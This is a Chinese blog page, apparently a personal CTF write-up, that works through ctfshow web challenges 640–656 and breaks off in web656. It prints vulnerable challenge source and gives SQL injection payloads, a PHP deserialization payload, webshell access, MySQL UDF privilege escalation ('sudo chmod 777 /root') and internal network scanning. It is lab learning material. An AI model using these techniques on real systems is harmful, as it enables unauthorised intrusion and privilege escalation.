@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]终极考核 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web640
+访问网页即可
+
+web641
+flag在响应头中
+
+web642
+查看html代码中有路径system36d
+访问该路径
+
+web643
+扫描该目录，发现文件secret.txt
+
+web644
+跳转到login.php，是一..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]终极考核</h2>
+            <div class="post-date">2024-04-17</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowzhong-ji-kao-he.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web640">web640</h2>
+<p>访问网页即可<br>
+<img src="https://fallingskies22.github.io/post-images/1713361076528.png" alt="" loading="lazy"></p>
+<h2 id="web641">web641</h2>
+<p>flag在响应头中<br>
+<img src="https://fallingskies22.github.io/post-images/1713361974268.png" alt="" loading="lazy"></p>
+<h2 id="web642">web642</h2>
+<p>查看html代码中有路径<code>system36d</code><br>
+访问该路径<br>
+<img src="https://fallingskies22.github.io/post-images/1713362279255.png" alt="" loading="lazy"></p>
+<h2 id="web643">web643</h2>
+<p>扫描该目录，发现文件secret.txt<br>
+<img src="https://fallingskies22.github.io/post-images/1713363333564.png" alt="" loading="lazy"></p>
+<h2 id="web644">web644</h2>
+<p>跳转到login.php，是一个前端js加密的锁，密码为0x36d<br>
+也可以在js代码中找到flag，跳转页面checklogin.php?s=10<br>
+<img src="https://fallingskies22.github.io/post-images/1713362761029.png" alt="" loading="lazy"></p>
+<h2 id="web645">web645</h2>
+<p>通过数据备份功能，下载备份文件<br>
+<img src="https://fallingskies22.github.io/post-images/1713363061518.png" alt="" loading="lazy"><br>
+<img src="https://fallingskies22.github.io/post-images/1713363033846.png" alt="" loading="lazy"></p>
+<h2 id="web646">web646</h2>
+<p>通过网络测试功能处，获取到绝对路径<br>
+<img src="https://fallingskies22.github.io/post-images/1713425640173.png" alt="" loading="lazy"></p>
+<p>通过扫描目录，发现robots.txt文件<br>
+<img src="https://fallingskies22.github.io/post-images/1713425870008.png" alt="" loading="lazy"></p>
+<p>访问source.txt文件，发现是用户管理和网络测试处的源码信息</p>
+<pre><code class="language-php">include 'init.php';
+
+function addUser($data,$username,$password){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'添加成功'
+	);
+	if(existsUser($data,$username)==0){
+		$s = $data.$username.'@'.$password.'|';
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户已存在';
+	}
+
+	return json_encode($ret);
+}
+
+function updateUser($data,$username,$password){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'更新成功'
+	);
+	if(existsUser($data,$username)&gt;0 &amp;&amp; $username!='admin'){
+		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\|/', $username.'@'.$password.'|', $data);
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户不存在或无权更新';
+	}
+
+	return json_encode($ret);
+}
+
+function delUser($data,$username){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'删除成功'
+	);
+	if(existsUser($data,$username)&gt;0 &amp;&amp; $username!='admin'){
+		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\|/', '', $data);
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户不存在或无权删除';
+	}
+
+	return json_encode($ret);
+
+}
+
+function existsUser($data,$username){
+	return preg_match('/'.$username.'@[0-9a-zA-Z]+\|/', $data);
+}
+
+function initCache(){
+	return file_exists('cache.php')?:file_put_contents('cache.php','&lt;!-- ctfshow-web-cache --&gt;');
+}
+
+function clearCache(){
+	shell_exec('rm -rf cache.php');
+	return 'ok';
+}
+
+function flushCache(){
+	if(file_exists('cache.php') &amp;&amp; file_get_contents('cache.php')===false){
+		return FLAG646;
+	}else{
+		return '';
+	}
+}
+
+function netTest($cmd){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'命令执行失败'
+	);
+
+	if(preg_match('/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/', $cmd)){
+		$res = shell_exec($cmd);
+		stripos(PHP_OS,'WIN')!==FALSE?$ret['message']=iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $res):$ret['message']=$res;
+		
+	}
+	if(preg_match('/^[A-Za-z]+$/', $cmd)){
+		$res = shell_exec($cmd);
+		stripos(PHP_OS,'WIN')!==FALSE?$ret['message']=iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $res):$ret['message']=$res;
+	}
+	
+	return json_encode($ret);
+}
+</code></pre>
+<p>分析代码，发现网络测试功能处的命令执行做了限制，只允许ping加ip形式，或者是全字母形式。<br>
+FLAG646显然是定义在init.php文件中。</p>
+<p>远程更新功能处存在SSRF漏洞，可以使用file协议读取文件<br>
+<img src="https://fallingskies22.github.io/post-images/1713425788528.png" alt="" loading="lazy"></p>
+<h2 id="web647">web647</h2>
+<p>使用命令执行功能查看目录下文件<br>
+<img src="https://fallingskies22.github.io/post-images/1713426803200.png" alt="" loading="lazy"></p>
+<p>再使用SSRF读取文件users.php<br>
+<img src="https://fallingskies22.github.io/post-images/1713426840256.png" alt="" loading="lazy"></p>
+<pre><code class="language-php">&lt;?php
+
+
+error_reporting(0);
+session_start();
+include 'init.php';
+
+$a=$_GET['action'];
+
+
+$data = file_get_contents(DB_PATH);
+$ret = '';
+switch ($a) {
+	case 'list':
+		$ret = getUsers($data,intval($_GET['page']),intval($_GET['limit']));
+		break;
+	case 'add':
+		$ret = addUser($data,$_GET['username'],$_GET['password']);
+		break;
+	case 'del':
+		$ret = delUser($data,$_GET['username']);
+		break;
+	case 'update':
+		$ret = updateUser($data,$_GET['username'],$_GET['password']);
+		break;
+	case 'backup':
+		backupUsers();
+		break;
+	case 'upload':
+		$ret = recoveryUsers();
+		break;
+	case 'phpInfo':
+		$ret = phpInfoTest();
+		break;
+	case 'netTest':
+		$ret = netTest($_GET['cmd']);
+		break;
+	case 'remoteUpdate':
+		$ret = remoteUpdate($_GET['auth'],$_GET['update_address']);
+		break;
+	case 'authKeyValidate':
+		$ret = authKeyValidate($_GET['auth']);
+		break;
+	case 'evilString':
+		evilString($_GET['m']);
+		break;
+	case 'evilNumber':
+		evilNumber($_GET['m'],$_GET['key']);
+		break;
+	case 'evilFunction':
+		evilFunction($_GET['m'],$_GET['key']);
+		break;
+	case 'evilArray':
+		evilArray($_GET['m'],$_GET['key']);
+		break;
+	case 'evilClass':
+		evilClass($_GET['m'],$_GET['key']);
+		break;
+	default:
+		$ret = json_encode(array(
+		'code'=&gt;0,
+		'message'=&gt;'数据获取失败',
+		));
+		break;
+}
+
+echo $ret;
+
+
+
+function getUsers($data,$page=1,$limit=10){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'数据获取成功',
+		'data'=&gt;array()
+	);
+
+	
+	$isadmin = '否';
+	$pass = '';
+	$content='无';
+
+	$users = explode('|', $data);
+	array_pop($users);
+	$index = 1;
+
+	foreach ($users as $u) {
+		if(explode('@', $u)[0]=='admin'){
+			$isadmin = '是';
+			$pass = 'flag就是管理员的密码，不过我隐藏了';
+			$content = '删除此条记录后flag就会消失';
+		}else{
+			$pass = explode('@', $u)[1];
+		}
+		array_push($ret['data'], array(
+			'id'=&gt;$index,
+			'username'=&gt;explode('@', $u)[0],
+			'password'=&gt;$pass,
+			'isAdmin'=&gt;$isadmin,
+			'content'=&gt;$content
+		));
+		$index +=1;
+	}
+	$ret['count']=$index;
+	$start = ($page-1)*$limit;
+	$ret['data']=array_slice($ret['data'], $start,$limit,true);
+
+	return json_encode($ret);
+
+}
+
+function addUser($data,$username,$password){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'添加成功'
+	);
+	if(existsUser($data,$username)==0){
+		$s = $data.$username.'@'.$password.'|';
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户已存在';
+	}
+
+	return json_encode($ret);
+}
+
+function updateUser($data,$username,$password){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'更新成功'
+	);
+	if(existsUser($data,$username)&gt;0 &amp;&amp; $username!='admin'){
+		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\\|/', $username.'@'.$password.'|', $data);
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户不存在或无权更新';
+	}
+
+	return json_encode($ret);
+}
+
+function delUser($data,$username){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'删除成功'
+	);
+	if(existsUser($data,$username)&gt;0 &amp;&amp; $username!='admin'){
+		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\\|/', '', $data);
+		file_put_contents(DB_PATH, $s);
+
+	}else{
+		$ret['code']=-1;
+		$ret['message']='用户不存在或无权删除';
+	}
+
+	return json_encode($ret);
+
+}
+
+function existsUser($data,$username){
+	return preg_match('/'.$username.'@[0-9a-zA-Z]+\\|/', $data);
+}
+
+function backupUsers(){
+	$file_name = DB_PATH;
+	if (! file_exists ($file_name )) {    
+	    header('HTTP/1.1 404 NOT FOUND');  
+	} else {    
+	    $file = fopen ($file_name, &quot;rb&quot; ); 
+	    Header ( &quot;Content-type: application/octet-stream&quot; ); 
+	    Header ( &quot;Accept-Ranges: bytes&quot; );  
+	    Header ( &quot;Accept-Length: &quot; . filesize ($file_name));  
+	    Header ( &quot;Content-Disposition: attachment; filename=backup.dat&quot;);     
+	    echo str_replace(FLAG645, 'flag就在这里，可惜不能给你', fread ( $file, filesize ($file_name)));    
+	    fclose ( $file );    
+	    exit ();    
+	}
+}
+
+function getArray($total, $times, $min, $max)
+    {
+        $data = array();
+        if ($min * $times &gt; $total) {
+            return array();
+        }
+        if ($max * $times &lt; $total) {
+            return array();
+        }
+        while ($times &gt;= 1) {
+            $times--;
+            $kmix = max($min, $total - $times * $max);
+            $kmax = min($max, $total - $times * $min);
+            $kAvg = $total / ($times + 1);
+            $kDis = min($kAvg - $kmix, $kmax - $kAvg);
+            $r = ((float)(rand(1, 10000) / 10000) - 0.5) * $kDis * 2;
+            $k = round($kAvg + $r);
+            $total -= $k;
+            $data[] = $k;
+        }
+        return $data;
+ }
+
+
+function recoveryUsers(){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'恢复成功'
+	);
+	if(isset($_FILES['file']) &amp;&amp; $_FILES['file']['size']&lt;1024*1024){
+		$file_name= $_FILES['file']['tmp_name'];
+		$result = move_uploaded_file($file_name, DB_PATH);
+		if($result===false){
+			$ret['message']='数据恢复失败 file_name'.$file_name.' DB_PATH='.DB_PATH;
+		}
+
+	}else{
+		$ret['message']='数据恢复失败';
+	}
+
+	return json_encode($ret);
+}
+
+function phpInfoTest(){
+	return phpinfo();
+
+}
+
+function authKeyValidate($auth){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;$auth==substr(FLAG645, 8)?'验证成功':'验证失败',
+		'status'=&gt;$auth==substr(FLAG645, 8)?'0':'-1'
+	);
+	return json_encode($ret);
+}
+
+function remoteUpdate($auth,$address){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'更新失败'
+	);
+
+	if($auth!==substr(FLAG645, 8)){
+		$ret['message']='权限key验证失败';
+		return json_encode($ret);
+	}else{
+		$content = file_get_contents($address);
+		$ret['message']=($content!==false?$content:'地址不可达');
+	}
+
+	return json_encode($ret);
+
+
+}
+
+function evilString($m){
+	$key = '372619038';
+	$content = call_user_func($m);
+	if(stripos($content, $key)!==FALSE){
+		echo shell_exec('cat /FLAG/FLAG647');
+	}else{
+		echo 'you are not 372619038?';
+	}
+
+}
+
+function evilClass($m,$k){
+	class ctfshow{
+		public $m;
+		public function construct($m){
+			$this-&gt;$m=$m;
+		}
+	}
+
+	$ctfshow=new ctfshow($m);
+	$ctfshow-&gt;$m=$m;
+	if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec('cat /FLAG/FLAG647')){
+		echo shell_exec('cat /FLAG/FLAG648');
+	}else{
+		echo 'mmmmm?';
+	}
+
+}
+
+function evilNumber($m,$k){
+	$number = getArray(1000,20,10,999);
+	if($number[$m]==$m &amp;&amp; $k==shell_exec('cat /FLAG/FLAG648')){
+		echo shell_exec('cat /FLAG/FLAG649');
+	}else{
+		echo 'number is right?';
+	}
+}
+
+function evilFunction($m,$k){
+	$key = 'ffffffff';
+	$content = call_user_func($m);
+	if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec('cat /FLAG/FLAG649')){
+		echo shell_exec('cat /FLAG/FLAG650');
+	}else{
+		echo 'you are not ffffffff?';
+	}
+}
+
+function evilArray($m,$k){
+	$arrays=unserialize($m);
+	if($arrays!==false){
+		if(array_key_exists('username', $arrays) &amp;&amp; in_array('ctfshow', get_object_vars($arrays)) &amp;&amp;  $k==shell_exec('cat /FLAG/FLAG650')){
+			echo shell_exec('cat /FLAG/FLAG651');
+		}else{
+			echo 'array?';
+		}
+	}
+}
+
+function netTest($cmd){
+	$ret = array(
+		'code'=&gt;0,
+		'message'=&gt;'命令执行失败'
+	);
+
+	if(preg_match('/^[A-Za-z]+$/', $cmd)){
+		$res = shell_exec($cmd);
+		stripos(PHP_OS,'WIN')!==FALSE?$ret['message']=iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $res):$ret['message']=$res;
+	}
+	
+	return json_encode($ret);
+}
+
+</code></pre>
+<p>查看evilString函数处存在call_user_func,但只能传入一个参数。</p>
+<p>设置PHPSESSID的值，再通过session_id这个无参函数可以获得指定值</p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1713427763187.png" alt="" loading="lazy"></figure>
+<p>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}</p>
+<h2 id="web648">web648</h2>
+<p>继续分析evilClass函数</p>
+<p>ctfshow类的定义处，construct魔术方法中使用的是<code>$ctfshow-&gt;$m</code>而不是<code>$ctfshow-&gt;m</code>，当出现类中没有的变量时，会自动添加一个该变量，如下图所示<br>
+<img src="https://fallingskies22.github.io/post-images/1713428985877.png" alt="" loading="lazy"></p>
+<p>所以任意传入m值即可。<br>
+<img src="https://fallingskies22.github.io/post-images/1713429080118.png" alt="" loading="lazy"><br>
+flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}</p>
+<h2 id="web649">web649</h2>
+<p>继续分析evilNumber函数</p>
+<p>getArray函数会生成长度为20的数组number，要求传入m值与number[m]相等。<br>
+不传m值，即可使m值为NULL<br>
+<img src="https://fallingskies22.github.io/post-images/1713464494765.png" alt="" loading="lazy"><br>
+flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}</p>
+<h2 id="web650">web650</h2>
+<p>继续分析evilFunction函数</p>
+<p>同样利用session_id函数，使content为ffffffff</p>
+<p><img src="https://fallingskies22.github.io/post-images/1713464647982.png" alt="" loading="lazy"><br>
+flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}</p>
+<h2 id="web651">web651</h2>
+<p>继续分析evilArray函数</p>
+<p>array_key_exists函数传入类也是可以的<br>
+生成反序列化payload</p>
+<pre><code class="language-php">&lt;?php
+class devil{
+    public $username;
+
+    public function __construct($username)
+    {
+        $this-&gt;username=$username;
+    }
+
+}
+
+echo serialize(new devil(&quot;ctfshow&quot;));
+</code></pre>
+<p><img src="https://fallingskies22.github.io/post-images/1713466216830.png" alt="" loading="lazy"><br>
+flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}</p>
+<h2 id="web652">web652</h2>
+<p>使用任意文件读取获取page.php源码</p>
+<pre><code class="language-php">&lt;?php
+
+
+error_reporting(0);
+include __DIR__.DIRECTORY_SEPARATOR.'system36d/util/dbutil.php';
+
+$id = isset($_GET['id'])?$_GET['id']:'1';
+
+//转义' &quot;  来实现防注入
+$id = addslashes($id);
+
+$name = db::get_username($id);
+?&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;欢迎&lt;?=$name;?&gt;,开启你的ctfshow GAME吧&lt;/title&gt;
+  &lt;link rel='stylesheet' href='/static/css/page.css'&gt;
+&lt;link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Montserrat&amp;amp;display=swap&quot;rel=&quot;stylesheet'&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/page_style.css&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;!-- partial:index.partial.html --&gt;
+&lt;div class=&quot;app&quot;&gt;
+
+	&lt;div class=&quot;cardList&quot;&gt;
+		&lt;button class=&quot;cardList__btn btn btn--left&quot;&gt;
+			&lt;div class=&quot;icon&quot;&gt;
+				&lt;svg&gt;
+					&lt;use xlink:href=&quot;#arrow-left&quot;&gt;&lt;/use&gt;
+				&lt;/svg&gt;
+			&lt;/div&gt;
+		&lt;/button&gt;
+
+		&lt;div class=&quot;cards__wrapper&quot;&gt;
+			&lt;div class=&quot;card current--card&quot;&gt;
+				&lt;div class=&quot;card__image&quot;&gt;
+					&lt;img src=&quot;/static/images/1.jpg&quot; alt=&quot;&quot; /&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+
+			&lt;div class=&quot;card next--card&quot;&gt;
+				&lt;div class=&quot;card__image&quot;&gt;
+					&lt;img src=&quot;/static/images/2.jpg&quot; alt=&quot;&quot; /&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+
+			&lt;div class=&quot;card previous--card&quot;&gt;
+				&lt;div class=&quot;card__image&quot;&gt;
+					&lt;img src=&quot;/static/images/3.jpg&quot; alt=&quot;&quot; /&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+
+		&lt;button class=&quot;cardList__btn btn btn--right&quot;&gt;
+			&lt;div class=&quot;icon&quot;&gt;
+				&lt;svg&gt;
+					&lt;use xlink:href=&quot;#arrow-right&quot;&gt;&lt;/use&gt;
+				&lt;/svg&gt;
+			&lt;/div&gt;
+		&lt;/button&gt;
+	&lt;/div&gt;
+
+	&lt;div class=&quot;infoList&quot;&gt;
+		&lt;div class=&quot;info__wrapper&quot;&gt;
+			&lt;div class=&quot;info current--info&quot;&gt;
+				&lt;h1 class=&quot;text name&quot;&gt;挑战&lt;/h1&gt;
+				&lt;h4 class=&quot;text location&quot;&gt;挑战永不停止&lt;/h4&gt;
+				&lt;p class=&quot;text description&quot;&gt;Adventure is never far away&lt;/p&gt;
+			&lt;/div&gt;
+
+			&lt;div class=&quot;info next--info&quot;&gt;
+				&lt;h1 class=&quot;text name&quot;&gt;勤奋&lt;/h1&gt;
+				&lt;h4 class=&quot;text location&quot;&gt;我每天都在努力工作，为的是能够使所有爱我的人以我为荣！&lt;/h4&gt;
+				&lt;p class=&quot;text description&quot;&gt;I work hard everyday so that all who love me will be proud of me!&lt;/p&gt;
+			&lt;/div&gt;
+
+			&lt;div class=&quot;info previous--info&quot;&gt;
+				&lt;h1 class=&quot;text name&quot;&gt;坚持&lt;/h1&gt;
+				&lt;h4 class=&quot;text location&quot;&gt;不积跬步，无以至千里&lt;/h4&gt;
+				&lt;p class=&quot;text description&quot;&gt;Let your dreams come true&lt;/p&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+	&lt;/div&gt;
+
+
+	&lt;div class=&quot;app__bg&quot;&gt;
+		&lt;div class=&quot;app__bg__image current--image&quot;&gt;
+			&lt;img src=&quot;/static/images/1.jpg&quot; alt=&quot;&quot; /&gt;
+		&lt;/div&gt;
+		&lt;div class=&quot;app__bg__image next--image&quot;&gt;
+			&lt;img src=&quot;/static/images/2.jpg&quot; alt=&quot;&quot; /&gt;
+		&lt;/div&gt;
+		&lt;div class=&quot;app__bg__image previous--image&quot;&gt;
+			&lt;img src=&quot;/static/images/3.jpg&quot; alt=&quot;&quot; /&gt;
+		&lt;/div&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;loading__wrapper&quot;&gt;
+	&lt;div class=&quot;loader--text&quot;&gt;Loading...&lt;/div&gt;
+	&lt;div class=&quot;loader&quot;&gt;
+		&lt;span&gt;&lt;/span&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;svg class=&quot;icons&quot; style=&quot;display: none;&quot;&gt;
+	&lt;symbol id=&quot;arrow-left&quot; xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'&gt;
+		&lt;polyline points='328 112 184 256 328 400'
+					 style='fill:none;stroke:#fff;stroke-linecap:round;stroke-linejoin:round;stroke-width:48px' /&gt;
+	&lt;/symbol&gt;
+	&lt;symbol id=&quot;arrow-right&quot; xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'&gt;
+		&lt;polyline points='184 112 328 256 184 400'
+					 style='fill:none;stroke:#fff;stroke-linecap:round;stroke-linejoin:round;stroke-width:48px' /&gt;
+	&lt;/symbol&gt;
+&lt;/svg&gt;
+
+&lt;!-- partial --&gt;
+  &lt;script src='/static/js/imagesloaded.pkgd.min.js'&gt;&lt;/script&gt;
+&lt;script src='/static/js/gsap.min.js'&gt;&lt;/script&gt;
+&lt;script  src=&quot;/static/js/script.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>system36d/util/dbutil.php源码</p>
+<pre><code class="language-php">&lt;?php
+
+class db{
+    private static $host='localhost';
+    private static $username='root';
+    private static $password='root';
+    private static $database='ctfshow';
+    private static $conn;
+
+    public static function get_key(){
+        $ret = '';
+        $conn = self::get_conn();
+        $res = $conn-&gt;query('select `key` from ctfshow_keys');
+        if($res){
+            $row = $res-&gt;fetch_array(MYSQLI_ASSOC);
+        }
+        $ret = $row['key'];
+        self::close();
+        return $ret;
+    }
+
+    public static function get_username($id){
+        $ret = '';
+        $conn = self::get_conn();
+        $res = $conn-&gt;query(&quot;select `username` from ctfshow_users where id = ($id)&quot;);
+        if($res){
+            $row = $res-&gt;fetch_array(MYSQLI_ASSOC);
+        }
+        $ret = $row['username'];
+        self::close();
+        return $ret;
+    }
+
+    private static function get_conn(){
+        if(self::$conn==null){
+            self::$conn = new mysqli(self::$host, self::$username, self::$password, self::$database);
+        }
+        return self::$conn;
+    }
+
+    private static function close(){
+        if(self::$conn!==null){
+            self::$conn-&gt;close();
+        }
+    }
+
+}
+</code></pre>
+<p>这里对引号进行了转义，但是使用的括号进行闭合<br>
+构造sql注入的payload</p>
+<pre><code>?id=0)%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
+
+?id=0)%20union%20select%20*%20from%20ctfshow_secret--+
+</code></pre>
+<p><img src="https://fallingskies22.github.io/post-images/1713467709863.png" alt="" loading="lazy"><br>
+flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p>
+<h2 id="web653">web653</h2>
+<p>init.php</p>
+<pre><code class="language-php">&lt;?php
+
+define('DB_PATH', __DIR__.'/db/data_you_never_know.db');
+define('FLAG645','flag645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}');
+define('FLAG646','flag646=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}');
+
+//存在漏洞，未修补前注释掉
+//include 'util/common.php';
+
+</code></pre>
+<p>util/common.php</p>
+<pre><code class="language-php">&lt;?php
+
+include 'dbutil.php';
+if($_GET['k']!==shell_exec('cat /FLAG/FLAG651')){
+    die('651flag未拿到');
+}
+if(isset($_POST['file']) &amp;&amp; file_exists($_POST['file'])){
+    if(db::get_key()==$_POST['key']){
+        include __DIR__.DIRECTORY_SEPARATOR.$_POST['file'];
+    }
+}
+
+</code></pre>
+<p>使用上题的注入点获取key</p>
+<pre><code>?id=0)%20union%20select`key`from%20ctfshow_keys--+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1713468401352.png" alt="" loading="lazy"></figure>
+<p>common.php中存在一个任意文件包含，需要找到可以控制写的文件。<br>
+/db/data_you_never_know.db这个文件是存储数据库信息的，</p>
+<p>使用数据还原功能，修改db数据库内容<br>
+<img src="https://fallingskies22.github.io/post-images/1713469078310.png" alt="" loading="lazy"><br>
+<img src="https://fallingskies22.github.io/post-images/1713469083105.png" alt="" loading="lazy"></p>
+<p>使用蚁剑连接shell</p>
+<pre><code>地址：https://f6b4bb4c-d634-4733-8975-41c98fa47e08.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}
+密码：1
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1713470298675.png" alt="" loading="lazy"></figure>
+<p>使用虚拟终端功能，读取/secret.txt文件<br>
+flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}</p>
+<h2 id="web654">web654</h2>
+<p>在/etc目录下发现sudoers.bak文件，正常sudoers文件需要root权限进行读取，这里留有备份文件，显然有问题。查看内容后发现最后一行</p>
+<pre><code>mysql ALL=(ALL:ALL) NOPASSWD:ALL
+</code></pre>
+<p>mysql用户拥有特殊权限<br>
+利用之前的数据库账号密码，使用udf提权。</p>
+<p>使用sqlmap中的udf64.so<br>
+sqlmap-dev\data\udf\mysql\linux\64\lib_mysqludf_sys.so_<br>
+这个文件是混淆过的，需要使用自带脚本解码</p>
+<pre><code>python extra/cloak/cloak.py -d -i data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o udf64.so
+</code></pre>
+<p>使用sql语句查询插件目录</p>
+<pre><code>show variables like &quot;%plugin%&quot;;
+返回/usr/lib/mariadb/plugin/
+</code></pre>
+<p>上传udf64.so后，移动到/usr/lib/mariadb/plugin/udf64.so</p>
+<p>这里使用蚁剑执行数据库命令时没有响应，改用冰蝎连接数据库。</p>
+<p>执行sql语句创建自定义函数</p>
+<pre><code class="language-sql">create function sys_eval returns string soname 'udf64.so';
+
+select sys_eval('sudo chmod 777 /root');
+</code></pre>
+<p><img src="https://fallingskies22.github.io/post-images/1713592353188.png" alt="" loading="lazy"><br>
+这里执行没有回显，所以直接修改root目录权限，然后用普通用户去读取文件。</p>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1713592438152.png" alt="" loading="lazy"></figure>
+<p>flag_654=ctfshow{4ab2c2ccd0c3c35fdba418d8502f5da9}</p>
+<h2 id="web655">web655</h2>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1713593355432.png" alt="" loading="lazy"></figure>
+<p>查看内网地址为<code>172.2.235.4</code><br>
+每次打开环境生成得ip不一样，所以后面截图可能会有其它地址。</p>
+<p>上传fscan扫描C段<br>
+<img src="https://fallingskies22.github.io/post-images/1713594137404.png" alt="" loading="lazy"></p>
+<p>发现<code>172.2.141.5</code>上开了许多服务，且存在备份文件泄露<br>
+再扫一下目录发现存在phpinfo.php</p>
+<p><code>wget http://172.2.92.5/phpinfo.php</code>里面含有flag</p>
+<figure data-type="image" tabindex="6"><img src="https://fallingskies22.github.io/post-images/1713608731522.png" alt="" loading="lazy"></figure>
+<p>flag_655=ctfshow{aada21bce99ddeab20020ac714686303}</p>
+<h2 id="web656">web656</h2>
+<p>将www.zip也下载下来分析，里面只有一个index.php</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
